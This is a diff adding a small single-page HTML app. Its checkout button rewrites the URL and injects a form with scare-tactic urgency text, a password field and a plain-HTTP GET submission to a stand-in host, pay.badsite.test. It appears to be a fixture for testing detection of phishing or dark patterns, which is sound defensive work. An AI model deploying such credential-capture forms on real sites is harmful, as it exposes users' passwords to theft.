@@ -1,0 +1,9 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Single page app</title></head>
+<body><h1 id="h">Home</h1><button id="go">Go to checkout</button><div id="view"></div>
+<script>
+document.getElementById("go").addEventListener("click", () => {
+  history.pushState({}, "", "/checkout?step=pay");
+  document.getElementById("h").textContent = "Checkout";
+  document.getElementById("view").innerHTML = '<p>Enter card now, offer expires, act now, final warning.</p><form action="http://pay.badsite.test/x" method="get"><input type="password" name="password"><button>Pay</button></form>';
+});
+</script></body></html>
